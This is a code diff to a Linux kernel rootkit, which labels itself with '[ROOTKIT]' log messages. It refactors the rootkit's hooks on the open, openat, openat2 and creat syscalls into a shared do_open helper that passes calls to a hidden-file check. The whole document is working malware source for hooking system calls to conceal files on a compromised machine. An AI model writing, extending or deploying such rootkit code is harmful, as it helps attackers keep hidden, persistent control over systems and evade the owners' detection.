@@ -40,14 +40,34 @@ static inline bool may_mount(void)
     return ns_capable(current->nsproxy->mnt_ns->user_ns, CAP_SYS_ADMIN);
 }
 
+static inline long do_open(const sysfun_t orig_func, struct pt_regs *const p_regs,
+                           const int i32_dfd, const char __user *const s_filename,
+                           const int i32_flags)
+{
+    int i32_at_flags = 0; // AT_* flags for lookup
+
+    IF_U (i32_flags & ~VALID_OPEN_FLAGS) {
+        return -EINVAL;
+    }
+
+    if (i32_flags & O_NOFOLLOW) {
+        i32_at_flags |= AT_SYMLINK_NOFOLLOW;
+    }
+
+    if (i32_flags & O_CREAT) {
+        i32_at_flags |= AT_LOOKUP_CREATE;
+    }
+
+    return do_check_hidden(orig_func, p_regs, i32_dfd, s_filename, i32_at_flags);
+}
+
 // sys_open syscall hook handler
 SYSCALL_HOOK_HANDLER3(open, orig_open, p_regs, const char __user *, s_filename, int, i32_flags,
                       umode_t, ui16_mode)
 {
     pr_info("[ROOTKIT] open(%p, %s%#x, %#ho)\n", s_filename, SIGNED_ARG(i32_flags), ui16_mode);
 
-    return do_check_hidden(orig_open, p_regs, AT_FDCWD, s_filename,
-                           i32_flags & O_NOFOLLOW ? AT_SYMLINK_NOFOLLOW : 0);
+    return do_open(orig_open, p_regs, AT_FDCWD, s_filename, i32_flags);
 }
 
 // sys_openat syscall hook handler
@@ -57,8 +77,7 @@ SYSCALL_HOOK_HANDLER4(openat, orig_openat, p_regs, int, i32_dfd, const char __us
     pr_info("[ROOTKIT] openat(%d, %p, %s%#x, %#ho)\n", i32_dfd, s_filename, SIGNED_ARG(i32_flags),
             ui16_mode);
 
-    return do_check_hidden(orig_openat, p_regs, i32_dfd, s_filename,
-                           i32_flags & O_NOFOLLOW ? AT_SYMLINK_NOFOLLOW : 0);
+    return do_open(orig_openat, p_regs, i32_dfd, s_filename, i32_flags);
 }
 
 // sys_openat2 syscall hook handler
@@ -81,8 +100,7 @@ SYSCALL_HOOK_HANDLER4(openat2, orig_openat2, p_regs, int, i32_dfd, const char __
         return err;
     }
 
-    return do_check_hidden(orig_openat2, p_regs, i32_dfd, s_filename,
-                           tmp_how.flags & O_NOFOLLOW ? AT_SYMLINK_NOFOLLOW : 0);
+    return do_open(orig_openat2, p_regs, i32_dfd, s_filename, tmp_how.flags);
 }
 
 // sys_creat syscall hook handler
@@ -91,7 +109,7 @@ SYSCALL_HOOK_HANDLER2(creat, orig_creat, p_regs, const char __user *, s_filename
 {
     pr_info("[ROOTKIT] creat(%p, %#ho)\n", s_filename, ui16_mode);
 
-    return do_check_hidden(orig_creat, p_regs, AT_FDCWD, s_filename, 0);
+    return do_open(orig_creat, p_regs, AT_FDCWD, s_filename, O_CREAT | O_WRONLY | O_TRUNC);
 }
 
 // sys_truncate syscall hook handler
